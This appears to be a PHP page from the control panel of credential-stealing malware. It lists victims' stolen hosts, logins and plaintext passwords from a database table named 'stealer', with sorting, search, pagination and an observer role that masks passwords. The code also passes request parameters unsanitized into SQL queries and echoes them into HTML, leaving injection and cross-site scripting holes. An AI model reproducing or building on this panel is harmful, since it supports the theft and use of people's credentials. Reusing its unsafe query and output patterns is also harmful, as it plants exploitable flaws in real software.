<?php
    
   session_start();

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   include("Header.php");
   include("Cfg/Config.php");
   include("Cfg/Options.php");
   include("Functions.php");

   $CCount = GetCredCount();

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $_SESSION['Name'] . ", " . $CCount . $lang["_010"].
                  "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
      </table>";


   if ($CCount > 0)
   {
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);

      CheckSQL();
      mysqli_select_db($link, $conf['dbname']);

      if ($_GET["f"])
      { 
         $f = ($_GET["f"]);
      }
      else
      {
         $f = 0;
      }

      if ($_GET["sort"] == "")
      {
         $so = "id";
         $J = "id";
      }
      else
      {
         $so = $_GET["sort"];
         $J = $_GET["sort"];
      }

      echo "<div align = center> 
               <table cellpadding=0 cellspacing=0 width=\"98%\">
                  <tr height=\"35\">
                     <td>
                        <div align = right>
                           <form action=\"Show_Cred.php\" method=\"get\">
                              <input type=\"text\" class=\"task\" name=\"Search\" value=\"" . $_GET["Search"] . "\">
                              <input type=\"submit\" class=\"button\" value=\"" . $lang["0165"] . "\">
                           </form>
                        </div>
                     </td>
                  </tr>
               </table>";

      sTable();
   
      $Search = $_GET["Search"];

      if ($Search == "")
      {
         $result = mysqli_query($link, "SELECT * FROM stealer ORDER BY $J DESC LIMIT $f, 100");
      }
      else
      {
         $result = mysqli_query($link, "SELECT * FROM stealer ORDER BY $J DESC");
      }

      $all = mysqli_query($link, "SELECT * FROM stealer");

      if ($_GET["showid"] && $Search == "")
      {
         $result = mysqli_query($link, 'SELECT * FROM stealer WHERE id = "' . $_GET["showid"] . '"');
      }

      if ($_GET["showsoft"] && $Search == "")
      {
         $result = mysqli_query($link, 'SELECT * FROM stealer WHERE type = "' . $_GET["showsoft"] . '"');
      }
  
      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td><div align = center> <a href=\"Show_Cred.php?sort=id" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0034"] . ":</div></td>
                     <td><div align = center> <a href=\"Show_Cred.php?sort=type" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0054"] . ":</div></td>
                     <td><div align = center> <a href=\"Show_Cred.php?sort=host" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0089"] . ":</div></td>
                     <td><div align = center> <a href=\"Show_Cred.php?sort=login" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0090"]  . ":</div></td>
                     <td><div align = center> <a href=\"Show_Cred.php?sort=password" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0091"] . ":</div></td>
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      { 
         $gb = GetBG();

         if (strpos($row['host'], $Search) || strpos($row['login'], $Search) || strpos($row['password'], $Search) || $row['host'] == $Search || $row['login'] == $Search || $row['password'] == $Search || $Search == "")
         {
            $login = $row['login'];
            $host = $row['host'];

            if ($_GET["full"] == "")
            {
               if (strlen($login) > 40)
               {
                  $login = substr($login, 0, 40) . "...";  
               }   

               if (strlen($host) > 40)
               {
                  $host= substr($host, 0, 40) . "...";  
               }
            }

            echo "<tr height=\"35\">
                     <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . "<a href=\"Show_Cred.php?showid=" . $row['id'] . "\">" . $row['id'] . "</a>" . "</td>
                     <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\\" . $row['type'] . ".png\"> " . "<a href=\"Show_Cred.php?showsoft=" . $row['type'] . "\">" . $row['type'] . "</a>" . "</td>
                     <td bgcolor = " . $gb . ">" . "&nbsp;" . $host . "</td>
                     <td bgcolor = " . $gb . ">" . "&nbsp;" . $login . "</td>";

            if ($_SESSION['Name'] != $conf["observer_login"])
            {
               echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;" . $row['password'] . "</div></td>"; 
            }
            else
            {                     
               echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;" . "******" . "</div></td>";
            }

            echo "</tr>";
         }        
      }

      echo "   </table>
            </div>";

      echo "<div align = center>
               <table border=\"0\" width=\"98%\" class=table_hig cellspacing=\"0\" cellpadding=\"0\" height=\"20\">
            <tr>
         <td>
      <div align = right>";

      if ($_GET["showid"] == "" && $Search == "")
      {  
         if ($_GET["show"] == 'all')
         {
            $sa = "&show=all";
         }

         while (mysqli_num_rows($all) > $i0)
         {    
            if (mysqli_num_rows($all) > $i0) 
            { 
               $total_pages++; 
            }

            $i0 = $i0 + 100;
         }

         $current_page = ($f / 100) + 1;

         if ($total_pages > 1)
         {
            echo "<div class=\"bblock1\"> " . $lang["0043"] . ": " . $current_page . "/" . $total_pages . "</div>";

            while (mysqli_num_rows($all) > $i)
            {    
               if (mysqli_num_rows($all) > $i) 
               { 
                  $c++;
            
                  if (mysqli_num_rows($all) > 100) 
                  {
                     if (($current_page - 15) < (($i / 100) + 1) && ($current_page + 15) > (($i / 100) + 1) && (($i / 100) + 1) <> $current_page)
                     {
                        echo "<div class=\"bblock1\"><a href=\"Show_Cred.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";
                     }

                     if ((($i / 100) + 1) == $current_page)
                     {
                        echo "<div class=\"bblock2\"><a href=\"Show_Cred.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";
                     }
                  }
               }

               $i = $i + 100;
            }
         }
      }

      echo "           </div>
         </td>
            </tr>
               </table>
            </div>";

      include("Footer.php");

      mysqli_close($link);
   }
   else
   {
      echo "<table border=\"0\" width=\"100%\" height=\"300\">
               <tr>
                  <td>
                     <div align = center>" . $lang["0166"] . "</div>
                  </td>
               </tr>
            </table>";
   }
?>